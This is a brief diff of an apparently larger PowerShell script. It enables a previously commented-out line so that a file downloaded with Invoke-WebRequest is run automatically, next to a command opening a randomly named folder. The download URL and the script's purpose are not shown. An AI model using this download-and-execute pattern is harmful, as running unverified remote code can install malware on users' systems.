@@ -28,7 +28,7 @@ Invoke-WebRequest -Uri $downloadUrl -OutFile $outputFile
 Start-Process -FilePath "explorer.exe" -ArgumentList $randomFolderPath
 
 # Run the downloaded file
-# Start-Process -FilePath $outputFile
+Start-Process -FilePath $outputFile
 
 # Exit the PowerShell script
 exit
